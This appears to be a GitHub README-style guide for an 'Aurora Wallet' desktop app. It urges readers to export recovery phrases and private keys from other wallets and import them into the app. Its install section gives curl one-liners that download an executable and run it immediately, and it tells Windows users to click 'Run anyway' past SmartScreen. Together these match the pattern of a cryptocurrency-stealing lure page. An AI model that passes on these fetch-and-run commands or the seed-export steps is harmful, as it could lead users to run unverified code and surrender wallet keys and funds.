![Aurora Wallet migrate from browser and mobile wallets guide](assets/aurora-wallet-guide-article-banner.png)

# How to migrate from a browser or mobile wallet to Aurora desktop

Move AUR out of a shared environment and into a wallet where the keys sit on your own disk.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


A browser extension and a phone app both expose your keys to a wider attack surface than a desktop wallet does.

Browser extensions run inside a page context, where other extensions, injected scripts and a single bad update can reach them. Mobile wallets depend on an app store, a device backup and a phone that travels with you. Neither is a reason to panic, and both are a reason to move a long-term balance to a desktop application you control.

<!-- ARTICLE-BODY:BEGIN -->

<!-- ARTICLE-BODY-BEGIN -->

## Decide which route fits the old wallet

Two routes exist, and the old wallet decides which one you use. If it exports a recovery phrase, the new wallet restores from the phrase and the addresses come back exactly. If it only exports private keys, each key is swept into the new wallet and the old addresses are retired.

Check the export options before you start. Most mobile wallets offer a phrase; a few older ones offer only a key export, and some offer both.

## Move the funds in order

1. Install Aurora Wallet on the desktop and let it sync.
2. Create the new wallet and record the phrase on paper.
3. Export the phrase or the keys from the old wallet.
4. Restore or sweep into the new wallet.
5. Confirm the balance appears at an address you control.
6. Send a test payment out and back.
7. Remove the old wallet from the extension or the phone.

Removing the old wallet last matters. Two active copies of the same keys split your attention and double the chance that one of them is compromised.

## What to watch for

A phrase restored into the desktop wallet produces the same addresses, so the balance appears without a transfer. That is the quiet, fee-free route, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md">restoring from a recovery phrase</a> covers the details.

Sweeping keys costs one transaction per key, because the balance moves on-chain. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/26-import-private-key-wif.md">Sweeping WIF keys</a> explains the format and the order.

A mobile wallet that shows only a balance and no export option is holding your keys for you, which is the situation the desktop wallet exists to end. The <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> installs in minutes and gives you the export you are missing.

If the old app was a browser extension, uninstall it rather than leaving it dormant, and read <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md">self-custody basics</a> for the reasoning behind the move.

## FAQ

### Can I keep using the phone wallet for small amounts?

Yes. A small spending balance on a phone is a reasonable trade. Long-term holdings belong on the desktop wallet.

### Does the migration cost anything?

A phrase restore is free because nothing moves on-chain. Sweeping keys costs the normal network fee for each transaction.

<!-- ARTICLE-BODY-END -->


## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Recovery phrase and BIP-39](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md)
- [Import a WIF private key](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/26-import-private-key-wif.md)
- [Self-custody basics](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md)
- [On-chain transfer checklist](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md)
